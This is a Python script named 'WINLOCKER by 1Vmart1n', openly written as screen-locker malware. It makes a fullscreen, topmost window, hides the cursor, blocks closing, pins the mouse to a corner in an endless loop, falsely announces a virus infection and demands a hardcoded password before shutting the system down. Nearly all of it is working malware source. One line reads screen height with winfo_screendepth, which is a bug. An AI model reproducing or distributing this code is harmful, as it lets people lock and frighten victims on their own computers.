from tkinter import *
from tkinter import messagebox
import sys
import pyautogui
import pygame
import os

#window
window = Tk()

window.attributes("-fullscreen", True)
window.config(cursor="none")
window.title("WINLOCKER by 1Vmart1n")
window ['bg'] = "blue"
window.wm_attributes("-topmost", 1)
pyautogui.FAILSAFE = False 


#Window_setting_______________________________________________________
#Size
normal_widht = 1920
normal_height = 1080

#Screen Size
screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screendepth()

#Get % size from base screen
percentage_width = screen_width / (normal_widht / 100)
percentage_height = screen_height / (normal_height / 100)


#scaling factor (average percentage of width and height)
scale_factor = ((percentage_width + percentage_height) / 2) / 100


#setting font size based on scaling factor
#font size is less than the minimum
#Setting the minimum size
fontsize = int(30 * scale_factor)
minimum_size = 23
if fontsize < minimum_size:
    fontsize = minimum_size

fontsizeHding = int(70 * scale_factor)
minimum_size = 50

if fontsizeHding < minimum_size:
    fontsizeHding = minimum_size



def win_exit():
    messagebox.showerror("ERROR", "Don't try to get out!!!")

window.protocol("WM_DELETE_WINDOW", win_exit)

#TEXT__________________________________________________________________
txt_one = Label(
                window, 
                text="Winlocker by 1Vmart1n", 
                font="Courier 13", 
                bg="blue", 
                fg="white"
                )




txt_two = Label(
                window, 
                text="Enter the password to unlock the system", 
                font="Arial 30", 
                bg="blue", 
                fg="white"
                )



txt_three = Label(
                window, 
                text="Your computer is infected with Winlocker virus!", 
                font="Arial 30", 
                bg="blue", 
                fg="white"
                )

txt_entry = Entry(
                window,
                font="Courier 20"
                )




unlock = Button(
                window, 
                text="UNLOCK", 
                font="Arial 30", 
                bg="white", 
                fg="black"
                )


txt_one.place(relx=.5, rely=.94, anchor="center")
txt_two.place(relx=.5, rely=.4, anchor="center")
txt_three.place(relx=.5, rely=.3, anchor="center") 
unlock.place(relx=.5, rely=.7, anchor="center", width=380, height=120)
txt_entry.place(relx=.5, rely=.5, anchor="center", width=380, height=40)

txt_entry.focus()

#MUSIC
pygame.init()
aud=pygame.mixer.Sound("C:\\Users\\-(NAME_USER)-\\Desktop\\mini_winlocker\\music.mp3")         #ENTER USER NAME_________________________________________________________
aud.play()


# Mouse lock | password
while True:
    pyautogui.moveTo(0,0)
    window.update()
    if txt_entry.get() == "123321.": #password
        os.system("shutdown -s -t 0")
        sys.exit()
    